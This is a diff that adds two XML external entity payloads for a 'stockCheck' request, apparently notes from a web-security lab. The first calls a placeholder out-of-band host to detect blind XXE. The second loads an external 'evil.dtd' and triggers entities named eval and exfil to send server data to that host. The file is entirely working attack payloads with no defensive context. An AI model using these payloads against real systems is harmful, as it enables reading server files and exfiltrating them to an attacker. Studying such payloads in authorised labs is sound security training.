@@ -1,0 +1,8 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://YOUR-OAST"> %xxe; ]>
+<stockCheck><productId>2</productId><storeId>1</storeId></stockCheck>
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://YOUR-OAST/evil.dtd"> %xxe;%eval;%exfil;]>
+<stockCheck><productId>2</productId><storeId>1</storeId></stockCheck>
+
